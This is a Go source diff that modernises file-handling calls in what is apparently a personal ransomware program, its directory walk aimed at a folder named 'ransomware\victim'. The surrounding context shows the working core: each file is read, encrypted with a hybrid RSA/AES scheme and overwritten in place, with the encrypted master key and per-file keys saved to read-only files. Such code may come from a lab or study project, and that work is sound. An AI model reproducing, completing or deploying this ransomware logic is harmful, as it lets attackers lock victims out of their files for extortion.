@@ -2,19 +2,18 @@
 package main
 
 import (
-	"crypto/rand"
-	"crypto/rsa"
-	"crypto/x509"
+	"bytes"
 	"crypto/aes"
 	"crypto/cipher"
+	"crypto/rand"
+	"crypto/rsa"
 	"crypto/sha256"
+	"crypto/x509"
 	"encoding/json"
-	"io/ioutil"
 	"log"
 	"math/big"
 	"os"
 	"path/filepath"
-	"bytes"
 )
 
 type EncryptionInfo struct {
@@ -47,7 +46,7 @@ func init() {
 
 	encryptedPrv, encSymKey := encryptHybrid(serverKey, x509.MarshalPKCS1PrivateKey(clientPrv))
 	rmifex("master.key")
-	ioutil.WriteFile("master.key", encryptedPrv, 0444)
+	os.WriteFile("master.key", encryptedPrv, 0444)
 	rmifex("keys.json")
 	eis = append(eis, EncryptionInfo{Path: "master.key", Key: encSymKey})
 	zero(x509.MarshalPKCS1PrivateKey(clientPrv))
@@ -93,7 +92,7 @@ func zero(bs []byte) {
 func main() {
 	filepath.Walk("C:\\Users\\tacixat\\prog\\ransomware\\victim", walker)
 	data, _ := json.Marshal(eis)
-	ioutil.WriteFile("file.keys", data, 0444)
+	os.WriteFile("file.keys", data, 0444)
 }
 
 func walker(path string, info os.FileInfo, err error) error {
@@ -106,9 +105,9 @@ func walker(path string, info os.FileInfo, err error) error {
 		return nil
 	}
 	log.Println(path, "(f)")
-	bs, _ := ioutil.ReadFile(path)
+	bs, _ := os.ReadFile(path)
 	cbs, k := encryptHybrid(clientKey, bs)
-	ioutil.WriteFile(path, cbs, 0666)
+	os.WriteFile(path, cbs, 0666)
 	eis = append(eis, EncryptionInfo{Path: path, Key: k})
 	return nil
 }
